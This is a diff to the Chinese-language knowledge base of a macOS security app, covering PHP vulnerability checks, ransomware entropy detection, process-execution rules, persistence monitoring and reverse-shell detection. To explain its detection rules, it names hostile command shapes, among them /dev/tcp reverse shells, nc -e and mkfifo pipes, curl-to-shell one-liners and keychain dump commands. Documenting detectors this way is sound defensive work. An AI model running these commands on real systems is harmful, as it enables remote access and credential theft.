@@ -1,5 +1,5 @@
 // ─────────────────────────────────────────────────────────────────────────────
-// Mirrored from the RoamSwitch app source tree — RoamSwitch 1.17.5 (build 184).
+// Mirrored from the RoamSwitch app source tree — RoamSwitch 1.17.6 (build 185).
 // The RoamSwitch app is the source of truth. Do NOT edit this copy: changes here
 // are not compiled into the shipping app and are overwritten on the next sync.
 // Regenerate with ./scripts/sync-from-roamswitch.sh — see SYNC.md.
@@ -244,14 +244,30 @@ extension RoamSwitchKnowledgeBase {
                 • 即時偵測：對 Web 與郵件防護（feat_webmail_download_guard）所監視資料夾中儲存或變更的 Web 檔案，在同一次靜態檢查中套用。與 Linux 版不同，無法在存取前阻止，全部為事後偵測（不使用 EndpointSecurity）。
                 • 開發用 Web 資料夾：`~/Sites`、`/Library/WebServer/Documents`、`~/Herd`、`~/Library/Application Support/Herd`、`/Applications/MAMP/htdocs`、`~/Library/Application Support/Local`、`~/Local Sites`、套件 CVE 比對的目標資料夾，以及 Web 與郵件防護的監視資料夾，每天掃描一次，也可手動掃描。每天一次的掃描不會進入 `node_modules`（相依套件）和 `.git`（監視資料夾的即時偵測，以及手動指定資料夾的掃描會檢查 `node_modules`）。`tests`、`fixtures` 等測試用資料夾不套用規則。
                 • PHP 工作階段資料夾：同一次檢查會讀取 PHP 工作階段資料夾（Homebrew、MAMP、Herd 的 php.ini 中的 `session.save_path`；未指定時為 `/tmp`、`/private/var/tmp` 和暫存資料夾；MAMP 的 `tmp/php`）中以 `sess_` 開頭的檔案。只列出資料夾內容，不深入子資料夾，也不會開啟不以 `sess_` 開頭的檔案。在 upload_progress 的值中混入 PHP 程式碼的工作階段檔案為 critical，工作階段值中帶有 PHP 起始標籤的為 high。critical 會移入隔離庫，high 只通知。
-                • PHP 設定檢查：設定中的「檢查 PHP 設定」會讀取 Homebrew、MAMP、Herd 和 PATH 中 php、php-fpm、frankenphp 的版本，php.ini、conf.d 和 FPM 池設定（session.upload_progress、PHP 8.5 的 fatal_error_backtraces、memory_limit），Apache 的 mod_php，以及工作階段檔案。版本會與 2026 年 10 月 21 日公布的兩個嚴重漏洞（CVE-2026-109618、CVE-2026-109619）的修復版本（8.2.35、8.3.36、8.4.27、8.5.12）比較，只判斷這一件事。PHP 可執行檔只在顯示版本時啟動，不執行腳本，也不進行網路通訊。結果只顯示在螢幕上，不會變更任何檔案。
+                • PHP 設定檢查：設定中的「檢查 PHP 設定」按鈕會讀取 PHP 的版本、設定和工作階段檔案。只讀取，不進行網路通訊，也不變更任何檔案。詳見 feat_php_check。
                 • 網域檢查：設定中的「檢查網域」會檢查所輸入網域（最多 20 個）的 SPF、DMARC、MTA-STS 與註冊到期日，並以參考方式顯示 CAA 與 DNSSEC。預設不查詢任何內容，只有輸入網域並按下按鈕時才會執行。這台 Mac 的 `dig` 向解析器查詢 TXT、CAA、DS 與 MX 記錄，`curl` 向該 TLD 註冊局的 RDAP 伺服器查詢（先讀取 IANA 的公開清單，其中不含網域名稱），對有 MX 與 `_mta-sts` TXT 記錄的網域還會向該網域自己的 mta-sts 主機查詢。結果只顯示在畫面上，不儲存，也不定期執行。
                 • 隔離：預設只有 critical 的偵測會走與其他威脅相同的流程（移入隔離庫，可在「管理隔離檔案」中還原或刪除）。high 只有通知、掛鉤和設定中的清單，不會動檔案（也可改為「隔離 critical 和 high」或「不隔離」）。medium 和 low 僅回報，保留在通知記錄中。被「排除並還原」的檔案，Web 規則不會再次偵測（與 ClamAV 的排除是不同的清單）。
                 • 偵測後掛鉤：把可執行檔放在 `~/Library/Application Support/RoamSwitch/hooks/post-detection`，每次偵測都會執行它，並透過標準輸入傳入 JSON（要求擁有者為自己或 root，群組和其他人不可寫，其上層資料夾也一樣；30 秒後中止）。
                 • 帳號處置（預設關閉）：在設定中啟用後，對於檔案已被移入隔離庫的偵測，會停用該檔案擁有者的登入 shell（保留 high 或隔離失敗時不做任何事）。需要管理員密碼確認，對已登入的使用者、root 以及 UID 小於 501 的帳號不做任何事。原來的 shell 會被記錄，可在設定中還原。
-                • 限制：只檢查檔案開頭的 4MB，且依固定的詞語序列比對，因此無法追蹤透過組合變數名稱等方式拆開的字串。
+                • 限制：最大 64MB 的檔案會完整檢查（更大的檔案檢查開頭與結尾各 4MB，圖片只檢查兩端），且依固定的詞語序列比對，因此無法追蹤透過組合變數名稱等方式拆開的字串。
                 """,
                 recommendation: "如果 Mac 上有開發用的 Web 資料夾，請啟用 Pro 並保持預設設定。認為是誤判的檔案，從隔離庫還原後不會再被偵測。"
+            ),
+            LocalizedEntry(
+                id: "feat_php_check",
+                title: "PHP 設定檢查（設定中的按鈕）",
+                summary: "檢查這台 Mac 上的 PHP 是否受 PHP 核心嚴重漏洞（CVE-2026-109618、CVE-2026-109619）以及尚無修正版本的 CVE-2026-115560 影響，並檢查工作階段檔案中是否被注入了程式碼。只讀取，不變更任何檔案，也不會進行網路通訊。",
+                details: """
+                • 位置：設定中「網頁與郵件保護監控資料夾」下「Web Shell 等偵測規則」裡的「檢查 PHP 設定」按鈕。只在按下時執行，不會定期執行，也不儲存。結果只顯示在畫面上，不變更任何檔案，也不需要管理員權限。
+                • 讀取的內容：Homebrew、MAMP、Herd 和 PATH 中的 php、php-fpm、frankenphp 的版本；php.ini、conf.d 和 FPM 池設定中的 session.upload_progress.enabled、PHP 8.5 的 fatal_error_backtraces 以及 memory_limit；Apache 的 mod_php 設定；PHP 工作階段資料夾中的 sess_ 檔案。不會進行網路通訊。PHP 執行檔只在顯示版本時啟動（`php -n -v`，FrankenPHP 為 `frankenphp version`，5 秒後中止）。不會執行任何腳本。
+                • 版本判定：與 2026 年 10 月 21 日公布的兩個嚴重漏洞（CVE-2026-109618、CVE-2026-109619）的修正版本 8.2.35、8.3.36、8.4.27、8.5.12 比較。早於修正版本為 high；PHP 官方沒有修正的 8.1 及更早版本同樣為 high；修正版本為 info；無法判定的系列為 medium。版本相同的執行檔合併為一項。
+                • 設定判定：session.upload_progress.enabled 在未設定時預設開啟。開啟為 medium（FPM 池有自己的值時，逐個池判斷）。fatal_error_backtraces 只在存在 PHP 8.5 時檢查：開啟且版本早於修正版本為 high，否則為 medium。mod_php 是最容易受影響的執行方式，為 medium；存在 PHP-FPM 或 FrankenPHP 為 info。memory_limit 僅以 info 顯示其值。-1 被稱為權宜之計，但不建議。
+                • CVE-2026-115560（2026 年 10 月 23 日公布；將在下一個例行版本中修正，目前沒有修正版本）：只有同時滿足三個條件時才為 high：設定中的 session.serialize_handler 為 php_binary 或 php_serialize，Web 程式碼以 ini_set() 切換它，且 session.upload_progress.enabled 已開啟。Web 程式碼指 Homebrew 的 var/www、MAMP 的 htdocs、/Library/WebServer/Documents、~/Sites、~/Herd 中的 PHP 檔案（.php .phtml .inc，包含 Composer 的 vendor）。不進入 node_modules 和 .git，也不跟隨連結。只滿足一部分時為 info，並顯示已滿足的條件。
+                • 工作階段檔案：只讀取工作階段資料夾正下方以 sess_ 開頭的檔案，不進入子資料夾。同時含有 upload_progress 標記與 PHP 程式碼的檔案（程式碼注入）為 critical，工作階段值中含有 PHP 起始標籤的為 high。本檢查不會移動檔案。critical 的隔離由每日與手動的 Web 規則掃描（feat_web_rules）完成。已用「排除並還原」還原的檔案不會被檢查。無法讀取的資料夾以 info 顯示為「無法讀取工作階段資料夾」。
+                • 結果的讀法：有 high 或 critical 項目時，開頭顯示「需要處理（高風險項目 N 項）」，否則顯示「沒有需要處理的項目」。接著顯示檢查的數量（PHP 執行檔、設定檔、工作階段檔案、資料夾）。項目依 [critical] [high] [medium] [info] 的順序排列，附有說明、處理方式與依據的路徑。找不到 PHP 時只顯示「未找到 PHP」。
+                • 判定範圍：只有這三項公告。不判定其他 PHP 漏洞，也不判定 WordPress 等應用程式的漏洞。
+                """,
+                recommendation: "如果版本早於修正版本，請更新 PHP。更新才是完整的解決辦法。暫時無法更新時，如果不使用 session.upload_progress.enabled，請將其設為 0 並重新啟動 PHP。這只是權宜之計，不能取代更新。"
             ),
             LocalizedEntry(
                 id: "feat_event_forwarding",
@@ -345,6 +361,7 @@ extension RoamSwitchKnowledgeBase {
                 • 子網域仿冒：分析像 `apple.com.login-verify.xyz` 這類混入知名品牌名稱的結構。
                 • 高風險 TLD：對於 `.xyz`、`.top`、`.tk`、`.icu` 等常見於一次性釣魚攻擊的 TLD 進行扣分。
                 • 明文 HTTP 與直接 IP：警告登入頁面使用未加密 HTTP，以及使用裸 IP 位址的網址。
+                • 威脅情資來源：若主機（或其上層網域）在連結防護所用的同一威脅情資來源中，會判定為危險，並視為連結防護會攔截的連結。比對只讀取本機已有的來源檔案，不會連線。
                 • 完全在地執行：網址絕不會傳送到外部分析 API，因此機密網址與權杖不會外洩。僅在展開短網址（追蹤重新導向）時，才會直接連線到該網址本身。
                 """,
                 recommendation: "收到郵件或聊天訊息中的可疑連結時，請勿直接點擊，先以連結安全性診斷檢查。"
@@ -360,7 +377,7 @@ extension RoamSwitchKnowledgeBase {
                 • 為何暫停而非結束：網路已經被切斷，因此暫停的程序無法造成進一步損害。若確認是誤判，解除時會以 SIGCONT 恢復該程序，不會遺失任何資料。
                 • 找回檔案：緊急視窗會顯示指向 No More Ransom 與日本警察廳頁面（兩者彙整了免費解密工具）的連結，以及前者的 QR 碼（隔離期間這台 Mac 無法開啟）。只有部分已被分析清楚的勒索軟體才有解密工具，RoamSwitch 本身不會解密檔案。
                 • 解除時：網路與 Wi-Fi 會恢復，暫停的程序會被恢復執行，遭竄改的誘餌檔案也會重新產生。
-                • 通用偵測（熵分析，Pro）：即使加密沒有碰觸誘餌檔案，也能根據寫入 `Documents`、`Desktop`、`Downloads`、`Pictures` 的檔案內容偵測出來。整個檔案的夏農熵達到 7.92 以上的檔案，在 5 秒內達到 20 個以上時，會被視為大規模加密的突發。為了因應只加密檔案開頭、或每隔一個 4KiB 以上的區塊加密一次的方式，還會檢查每個 4KiB 的區間：有 2 個以上區間達到 7.9 以上、且大小在 16KiB 以上的檔案也會計入。壓縮格式的檔頭完好的檔案（ZIP、PDF、JPEG 等）不在檢查範圍內。區間判定不用於建置產物（`.o`、`.a`、`.rlib`、`.rmeta`、`.so`、`.dylib`、`.class`、`.pyc`、`.wasm` 等）以及 `target` 資料夾內的檔案。只加密小於 4KiB 的區塊（例如 16 位元組或 256 位元組）的方式，這個判定看不到。實測中，這些資料夾裡的 3,531 個真實檔案沒有出現額外的偵測。用 150 個真實檔案模擬只加密開頭、以及每隔一個 4KiB 以上的區塊加密一次的情形，整個檔案的數值偵測到 0～35%，區間判定偵測到 100%。
+                • 通用偵測（熵分析，Pro）：即使加密沒有碰觸誘餌檔案，也能根據寫入 `Documents`、`Desktop`、`Downloads`、`Pictures` 的檔案內容偵測出來。整個檔案的夏農熵達到 7.92 以上的檔案，在 5 秒內達到 20 個以上時，會被視為大規模加密的突發。為了因應只加密檔案開頭、或每隔一個 4KiB 以上的區塊加密一次的方式，還會檢查每個 4KiB 的區間：有 2 個以上區間達到 7.9 以上、且大小在 16KiB 以上的檔案也會計入。壓縮格式的檔頭完好的檔案（ZIP、PDF、JPEG 等）不在檢查範圍內。區間判定不用於建置產物（`.o`、`.a`、`.rlib`、`.rmeta`、`.so`、`.dylib`、`.class`、`.pyc`、`.wasm` 等）以及 `target` 資料夾內的檔案。針對更小的區塊，還會把檔案開頭的 256KiB 依 256 位元組切成區間：看起來像隨機數的區間（7.0 以上）占全部區間的 5%～30%，並以 4 個區間以上的同一間隔（例如每 2KiB 中的 256 位元組）出現 8 處以上、且大小在 16KiB 以上的檔案也會計入。像 PDF 或資料庫裡的壓縮資料那樣，看起來像隨機數的區間只連成一整塊的檔案不計入。只加密 16 位元組這類更細的區塊的方式，兩種判定都看不到。若要只關閉這兩種區間判定、保留整個檔案的判定，請執行 `defaults write com.tetsuharu.RoamSwitch RoamSwitch.RansomwareEntropyWindowRule -bool false`。實測中，這些資料夾裡的 3,531 個真實檔案沒有出現額外的偵測。用 150 個真實檔案模擬只加密開頭、以及每隔一個 4KiB 以上的區塊加密一次的情形，整個檔案的數值偵測到 0～35%，區間判定偵測到 100%。 256 位元組的判定在一台 Mac 的 1,026,286 個一般檔案（應用程式、函式庫、快取、Homebrew、開發資料夾）中沒有偵測到，在把 150 個真實檔案每 2KiB 中的 256 位元組替換成隨機位元組的模擬中，150 個全部偵測到。
                 • 預設值：首次啟用 Pro 時自動開啟。事件記錄可透過 MCP 工具 `get_canary_status` 取得，並可在選單中使用「勒索軟體防禦模擬測試（驗證運作）」安全地測試。
                 • 放置數量:選單項目會顯示「已放置 N/M」。一個都沒放成時會帶 ⚠️ 並顯示原因。憑證蜜標同樣如此,會統計未放置的原因(已有真實檔案、存在符號連結、寫入失敗),並顯示在 `get_honeytoken_status` 的 placement 中。
                 """,
@@ -420,8 +437,10 @@ extension RoamSwitchKnowledgeBase {
                 summary: "透過 Apple 內建的 /usr/bin/eslogger（macOS 13 以上）記錄這台 Mac 上啟動了哪些程式，並在某次啟動符合可疑組合時通知您。它不會阻擋任何執行，也不會切斷網路；記錄只保留在這台 Mac 上。",
                 details: """
                 • 原理：特權輔助程式把 `/usr/bin/eslogger exec fork exit` 當作子程序執行並解析其 JSON 串流。eslogger 隨 macOS 提供；RoamSwitch 不使用也不申請 EndpointSecurity 權限（entitlement），因此這是事後觀察，而不是執行前攔截。
+                • 開啟檔案的行程記錄（選用，預設關閉，是本記錄的附屬選項）：在通知中顯示讀取過偽造憑證檔案、或寫入過 AI 代理程式設定檔和自動啟動位置的行程（PID、父行程、指令、簽章）。輔助程式會再執行兩個 eslogger，一個用於 `open`，一個用於 `create rename unlink clone copyfile truncate`。eslogger 無法依路徑過濾，`open` 會輸出 Mac 開啟的所有檔案，所以輔助程式只檢查每一行裡有沒有要監看的路徑，把符合的少數幾行交給沙盒中的解析行程，其餘立即丟棄。保留下來的只有涉及被監看檔案的事件，在記憶體中保存約三分鐘，不寫入磁碟，也不會傳送到外部。它會佔用 CPU：`open` 一側在正常使用中的實測約佔一個核心的 5%；建立、重新命名、刪除一側的事件少得多，幾乎不增加負載。輔助程式分別量測兩者的負載，最近五分鐘的平均值持續超過上限時，只會讓超限的那一個依序停止 15 分鐘、1 小時、6 小時。上限是 `open` 一側為一個核心的 12%（可在「行程執行記錄」視窗中變更），另一側為 3%。狀態和量測到的負載顯示在「行程執行記錄」視窗中。「完整磁碟取用權限」的授權與本記錄相同。無法確定行程時，通知中會寫明原因（關閉、因負載暫停、尚未開始、未執行）。
                 • 前提：macOS 13 以上，並在「完整磁碟取用權限」中允許 RoamSwitch。沒有該權限時，視窗只會顯示「無法使用執行記錄：請在「完整磁碟取用權限」中允許 RoamSwitch（清單中沒有時，用「+」加入 /Applications/RoamSwitch.app）」（或找不到 eslogger），不會改用持續輪詢。啟用記錄之前、輔助程式啟動之前的事件不會被記錄。
                 • 關聯規則（僅通知，預設保持安靜，每條規則都有固定 ID 和 MITRE ATT&CK 技術編號）：瀏覽器/Office/郵件 App 直接啟動 Shell 或指令碼直譯器（exec.shell_from_app，T1059）；從 /tmp、/private/var/tmp、/var/folders 下的暫存資料夾、/Users/Shared 或帶隔離屬性的位置執行未簽署/臨時簽署的二進位檔（exec.untrusted_location，T1204.002）；將 curl/wget 傳給 Shell 的 `sh -c` 單行指令，並伴有 IP 直連 URL、base64、eval、關閉 TLS 驗證或瀏覽器作為父程序等加重因素（exec.pipe_to_shell，T1059.004）；`osascript -e` 把 do shell script 與 base64/eval 結合（exec.osascript_obfuscated，T1059.002）；`xattr -d com.apple.quarantine` 之後 15 分鐘內執行該檔案（exec.quarantine_stripped_then_exec，T1553.001）；launchd 從最近 24 小時內寫入的 LaunchAgent/LaunchDaemon 啟動未簽署/臨時簽署的二進位檔（exec.launchd_untrusted_binary，T1543.001/.004）；在非 Shell 且非 Apple 簽署的祖先程序之下執行 `security find-generic-password -w` 或 `dump-keychain`（exec.keychain_access，T1555.001）；osascript 以外的裸直譯器執行內嵌的 `-c`/`-e`/`-Command` 單行程式碼，並將 base64/eval 與下載或類似 exec 的呼叫結合（exec.interpreter_inline_obfuscated，T1059）；設定了 DYLD_INSERT_LIBRARIES 的非 Apple 簽署二進位檔被執行（exec.dyld_insert_libraries，T1574.006）；既非 RoamSwitch 自身也非 Apple 程序執行的 `tmutil deletelocalsnapshots`/`thinlocalsnapshots`（exec.ransomware_recovery_tampering，T1490）；指令列直接指定 RoamSwitch 放置的誘餌憑證檔案（如 ~/.aws/credentials、~/.env.backup，內容中帶有標記；真實檔案不會符合，透過函式庫讀取的情況由蜜罐權杖監視負責）（exec.honeytoken_path，T1552.001）。另有兩條規則針對由腳本或 AI 代理驅動的攻擊工具鏈（例如 HexStrike AI 後端）：一個行程在 30 秒內以 which/type 連續查詢 8 種以上不同的滲透測試工具（exec.offensive_tool_inventory，T1595），以及腳本執行環境或 AI 程式設計代理在 2 分鐘內啟動 3 種以上此類不同工具（exec.offensive_tool_burst，T1595）。人在終端機裡輸入相同的指令不會被標記。在「終端機」裡正常輸入的 `curl | sh` 不會被刻意標記。 寫在 `sh -c` 指令列中，或直接啟動的 nc、ncat、socat 指令列中的反向 Shell（含綁定 Shell）形態也會被標記（exec.reverse_shell_argv，T1059.004）：攜帶 Shell 的 /dev/tcp、/dev/udp 重新導向，把 mkfifo 管線接到 nc、telnet、openssl s_client 或 ssh 的形態，`nc -e <Shell>`，socat 的 exec:<Shell>，以及透過管線交給 Shell 的 openssl s_client。`echo > /dev/tcp/host/22` 這類連接埠探測，以及僅在文字中提到這些指令的內容不會被標記。
+                • 服務帳號啟動的 Shell（exec.shell_from_service，T1505.003）：當 Web 伺服器或應用程式服務程序（httpd、nginx、php-fpm、java、tomcat、gunicorn、uwsgi、node 等）以服務帳號（macOS 內建 Apache 的 `_www`、MacPorts 的 `www` 等）直接啟動 Shell（sh、bash、zsh 等），或 python、perl、ruby、node 的 -c / -e 單行指令時發出通知。這是 Web Shell 執行指令時的典型形態。帳號和服務程序兩者都符合才會偵測，因此以自己的帳號執行的開發伺服器、apachectl、brew services 和 cron 不會通知。要新增帳號，請執行 `defaults write com.tetsuharu.RoamSwitch RoamSwitch.ExecRule.ServiceUsers "名稱,名稱"`，然後重新啟動 App，或先關閉再重新開啟程序執行記錄（設定只是向清單新增，`_www` 不會被移除）。`_mysql`、`_postgres` 等資料庫帳號不在預設範圍內，因為資料庫本身會啟動 Shell（例如 archive_command）。不啟動程式、直接在 Web 伺服器程序內部執行程式碼的 Web Shell 無法偵測到。
                 • 通知：一則通知（Pro）加上事件時間軸中的一筆記錄（來源 execRecorder，處置「僅通知」）。通知本身絕不會觸發 Air-Gap 等隔離。
                 • 儲存：分段的 JSON Lines，位於 /Library/Application Support/RoamSwitch/exec_log（僅 root 可讀：0700/0600，因為命令列可能包含機密；App、檢視器與 MCP 伺服器只能透過具權限的 Helper 讀取），預設 200 MB·14 天（可變更），當機安全的輪替。各分段以雜湊鏈相連，可發現被刪除、編輯或截斷的分段（「驗證雜湊鏈」）；這是竄改偵測，而非竄改防護。不會記錄環境變數，但命令列引數中可能包含敏感資訊。
                 • 負載控制：有界佇列，過載時丟棄最舊的行（計數並顯示），指數退避重新啟動，關閉後 eslogger 會被完全停止。
@@ -438,7 +457,7 @@ extension RoamSwitchKnowledgeBase {
                 • 監控範圍：透過 FSEvents 監控 `~/Library/LaunchAgents`、`/Library/LaunchAgents` 與 `/Library/LaunchDaemons`（去彈跳約 1.5 秒）。
                 • 判斷依據：近期的資訊竊取程式常透過合法 Apple 簽署的 `/bin/bash` 或 `/usr/bin/osascript` 執行以 Base64 隱藏的指令碼來達成持久化。由於直譯器本身的簽署有效，任何直接啟動裸直譯器的註冊，無論簽署狀態都會被視為可疑，其指令碼參數也會經由靜態特徵碼檢查。未簽署或簽署無效的執行檔同樣會被標記。Homebrew services 的包裝程式則為例外。
                 • 僅偵測：由於未使用 EndpointSecurity 授權，無法阻止 plist 的寫入本身。系統會在寫入後約 1.5 秒內判斷並回報。
-                • 另外監看的位置（會自動執行的地方）：shell 啟動檔（`~/.zshrc`, `~/.zshenv`, `~/.zprofile`, `~/.zlogin`, `~/.zlogout`, `~/.bashrc`, `~/.bash_profile`, `~/.bash_login`, `~/.profile`, `~/.bash_logout`, `~/.config/fish/config.fish`, `/etc/zshrc`, `/etc/zshenv`, `/etc/zprofile`, `/etc/zlogin`, `/etc/profile`, `/etc/bashrc`）、`~/.ssh/rc` 和 `/etc/ssh/sshrc`、定期指令碼（`/etc/periodic/{daily,weekly,monthly}`、`/usr/local/etc/periodic/*`、`/etc/{daily,weekly,monthly}.local`，僅在存在時）、存放 git 掛鉤的資料夾（`~/.git-templates/hooks`、`~/.config/git/hooks`）、登入/登出掛鉤（`/Library/Preferences/com.apple.loginwindow.plist` 中的 LoginHook / LogoutHook），以及資料夾動作指令碼（`~/Library/Scripts/Folder Action Scripts` 和 `/Library/Scripts/Folder Action Scripts`；已編譯的 AppleScript 以 osadecompile 讀取，`.scptd` 套件不讀取）。每 5 秒檢查一次；第一次只記錄既有內容，不通知。不涵蓋 `emond`。
+                • 另外監看的位置（會自動執行的地方）：shell 啟動檔（`~/.zshrc`, `~/.zshenv`, `~/.zprofile`, `~/.zlogin`, `~/.zlogout`, `~/.bashrc`, `~/.bash_profile`, `~/.bash_login`, `~/.profile`, `~/.bash_logout`, `~/.config/fish/config.fish`, `~/.config/fish/conf.d/*.fish`, `/etc/zshrc`, `/etc/zshenv`, `/etc/zprofile`, `/etc/zlogin`, `/etc/profile`, `/etc/bashrc`）、`~/.ssh/rc` 和 `/etc/ssh/sshrc`、定期指令碼（`/etc/periodic/{daily,weekly,monthly}`、`/usr/local/etc/periodic/*`、`/etc/{daily,weekly,monthly}.local`，僅在存在時）、存放 git 掛鉤的資料夾（`~/.git-templates/hooks`、`~/.config/git/hooks`、家目錄下最多四層的工作副本（最多 400 個）的 `.git/hooks`，以及 `core.hooksPath` 指向的資料夾；只看有執行權限的掛鉤，不看 `*.sample`；Desktop、Documents、Downloads、Library 內不搜尋，已註冊的專案資料夾除外；`.git` 是檔案的子模組和連結的 worktree 會追到真正的 git 目錄（`.git/modules/<名稱>/hooks`，或連結的 worktree 共用的主儲存庫 `.git/hooks`），共用的資料夾只看一次；工作副本超過 400 個時，超出的部分不看，`get_guard_status` 中的 persistenceMonitor 會變成 partial，其 readers 的 `scopeLimited` 為 true）、登入/登出掛鉤（`/Library/Preferences/com.apple.loginwindow.plist` 中的 LoginHook / LogoutHook），以及資料夾動作指令碼（`~/Library/Scripts/Folder Action Scripts` 和 `/Library/Scripts/Folder Action Scripts`；已編譯的 AppleScript 以 osadecompile 讀取，`.scptd` 套件不讀取）。每 5 秒檢查一次；第一次只記錄既有內容，不通知。不涵蓋 `emond`。
                 • Python 啟動檔案：也會檢查 Python 每次啟動時自行執行的檔案，即 Python 本身 site 資料夾以及家目錄下虛擬環境（向下尋找 4 層，每分鐘重新尋找一次，不含 Desktop、Documents、Downloads、Library）中的 `.pth` 檔、`sitecustomize.py`、`usercustomize.py`，以及 `.pth` 從同一資料夾匯入的模組。僅當程式碼讀取三種以上憑證存放位置、解碼後直接執行、下載後直接執行或呈反向 shell 形態時才會通知，隱藏字串的程式碼看不到。
                 • 判定（上述位置）：只通知形式為反向 Shell、解碼後直接執行、下載後直接執行、或執行暫存資料夾（`/tmp`、`/var/folders` 等）中程式的行。新增一般的行不會通知。shell 啟動檔、`~/.ssh/rc` 和 git 掛鉤由擁有者頻繁編輯，因此原本就有的可疑行不會再次通知，只通知新增的行。登入/登出掛鉤只要被設定就會通知。
                 • 預設值：Pro 版預設開啟。可在「惡意軟體防護」→「監控新增自動啟動註冊(LaunchAgent/Daemon) (Pro)」切換。
@@ -480,11 +499,11 @@ extension RoamSwitchKnowledgeBase {
                 • 開啟方式：透過選單列項目「🐚/✅ 持續監看反向 Shell (Pro)」切換。
                 • 原理：每 4 秒用 libproc 讀取程序列表以及各程序開啟的檔案描述符。不執行 lsof 等外部指令，也不讀取連線的內容。
                 • 偵測的形式：(1) Shell 或直譯器（sh、bash、zsh、python、perl、ruby、php、node 等）的輸入（0 號）和輸出（1 號）是同一條已建立的對外 TCP 連線（如 `bash -i >& /dev/tcp/H/P 0>&1`，或用 dup2 接管 socket 的 Python 單行指令）。(2) nc、ncat、socat 透過 `-e`、`--exec` 或 `exec:` 把另一個程式接到連線上。(3) 在 nc 旁邊，由同一個父程序啟動了輸入輸出皆為管線的 Shell（使用 `mkfifo` 的迴圈；Mac 內建的 nc 沒有 `-e`，所以會用這種形式）。
-                • 監看的對象：僅限公開位址。家用區域網路、Tailscale（100.64.0.0/10）、容器和迴路位址不在監看範圍內，以免遠端開發和 ProxyCommand 造成誤報。
+                • 監看的對象：預設僅限公開位址。家用區域網路、Tailscale（100.64.0.0/10）和容器不在監看範圍內，以免遠端開發和 ProxyCommand 造成誤報。開啟選單項目「反向 Shell 偵測：也偵測區域網路內的連線對象」（或 `defaults write com.tetsuharu.RoamSwitch RoamSwitch.ReverseShellWatch.IncludePrivateV1 -bool true`）後，這些也會被監看；迴路位址一律不監看。
                 • 對外連線的判定：由監聽連接埠接受的連線，或本機連接埠小於 49152 的連線，不視為反向 Shell。
                 • 通知條件：只有連續兩次掃描都看到相同狀態才會通知，每個程序只通知一次。同名程式連線到同一對象的通知，每 15 分鐘最多一次。
                 • 僅通知：不會自動結束程序，也不會中斷網路。
-                • 限制：只檢查已登入使用者自己的程序，看不到 root 權限的程序。名稱不在清單中的程式以及連線到私有位址的情況不在監看範圍內。只寫在腳本檔案裡的反向 Shell，在連線之前看不到。
+                • 限制：App 讀取已登入使用者自己的程序，其他帳號（包括 root）的程序由 root 輔助程式讀取。比 App 舊的輔助程式不會被詢問，此時看不到 root 權限的程序。名稱不在清單中的程式不在監看範圍內；連線到私有位址的情況，在上述選單項目關閉時也不在監看範圍內。只寫在腳本檔案裡的反向 Shell，在連線之前看不到。
                 • 允許清單：對於認識的程式，可透過選單「將最近的反向 Shell 偵測加入允許清單…」以「名稱@目標」的形式加入。
                 • 程序執行記錄器（feat_exec_recorder）的 `exec.reverse_shell_argv` 在程序啟動時偵測指令列中寫出的形式；本功能偵測連線之後的實際狀態。
                 • 失去 Pro 授權後會自動關閉。
@@ -500,7 +519,8 @@ extension RoamSwitchKnowledgeBase {
                 • 原理：接收 macOS 系統設定儲存區（SCDynamicStore）的變化，等待幾秒後，讀取有線和 Wi-Fi（en 介面）的 DNS 與路由器。不使用外部指令，也不產生網路通訊。
                 • 比較對象：Wi-Fi 以名稱（SSID）區分網路；讀不到名稱時以及有線連線，以路由器的硬體位址區分。第一次見到的網路只會記住，不會通知。
                 • 會通知的變化：(1) 該網路上從未見過的 DNS 伺服器（路由器自身的位址、眾所周知的公共 DNS 以及 RoamSwitch 的安全 DNS 除外）。(2) 從未見過的路由器和從未見過的 DNS 伺服器同時出現，這是偽造 DHCP 伺服器發放的形式，通知更強烈。(3) 來自從未見過的主機的代理伺服器自動設定（PAC）。(4)「自動探索代理伺服器」（WPAD）新近被開啟。路由器自身的位址只有在該路由器已知時才會被排除。若路由器本身是新的，並且把自己的位址也當作 DNS 伺服器發放，則視為新路由器加新 DNS 伺服器，通知更強烈。
-                • 不會通知的情況：只有路由器變化時僅作記錄（更換很常見，閘道變化由網路歷史和 ARP 監控負責）。VPN、Tailscale 等通道（utun 等）不在讀取範圍內。儲存在服務設定中的 DNS（由本人、設定描述檔或 RoamSwitch 的安全 DNS 設定）不是網路發放的，因此不比較。DNS-over-HTTPS 描述檔不會出現在這裡。在出現過三個以上路由器的網路（校園或公司等每個地點子網路不同）中，新路由器被視為正常。
+                • 不會通知的情況：只有路由器變化時僅作記錄（更換很常見，閘道變化由網路歷史和 ARP 監控負責）。VPN、Tailscale 等通道（utun 等）不在讀取範圍內。儲存在服務設定中的 DNS（由本人、設定描述檔或 RoamSwitch 的安全 DNS 設定）不是網路發放的，因此不與網路的歷史比較（見下一條）。DNS-over-HTTPS 描述檔不會出現在這裡。在出現過三個以上路由器的網路（校園或公司等每個地點子網路不同）中，新路由器被視為正常。
+                • 已儲存的 DNS：有線或 Wi-Fi 服務的已儲存設定裡出現以前沒有的 DNS 伺服器時（由 `networksetup -setdnsservers` 或系統設定的「網路」面板寫入），會發出一次較弱的通知。路由器本身的位址、迴路位址、廣為人知的公開解析器、RoamSwitch 的安全 DNS，以及該服務以前儲存過的內容不在此列。無法判斷是誰寫入了已儲存的設定，所以你自己改的也會是同樣的通知；在選單中接受後，會記錄為已知。監看開始後的第一次讀取，以及第一次見到的服務，只做記錄。隧道（utun 等）的服務不讀取。
                 • 接受：相同內容的通知只發送一次。對於知道原因的變化（例如更換路由器），請在選單中選擇「將網路設定的基準更新為目前狀態…」，把目前狀態記錄為該網路的正確狀態。不會自動接受。
                 • 與稽核的關係：稽核項目「代理伺服器自動探索 (WPAD / PAC)」（proxy_autodiscovery）檢查此刻 WPAD 或網路指定的 PAC 是否生效。
                 • 僅通知：不會修改設定，也不會封鎖任何內容。
@@ -650,6 +670,7 @@ extension RoamSwitchKnowledgeBase {
                 • 資料更新：CVE 對應表約每週從已簽署的清單取得一次，僅接收。取得之前會顯示尚未下載，且不會偵測到任何項目。
                 • MCP 工具：`run_package_cve_scan`（Homebrew）與 `run_package_cve_scan_languages`（相依性，`watchedFolders` 參數）。
                 • 什麼都沒檢查時:沒有 Homebrew、brew 失敗或沒有套件時,視窗會顯示灰色的「什麼都沒有檢查」,而不是綠色的「未發現」(`run_package_cve_scan` 的 homebrewInventory 為 brew_missing 或 brew_failed)。CVE 資料更新失敗時,視窗與選單會顯示上次成功更新的時間與失敗原因,`get_guard_status` 的 feedUpdates 中也有。
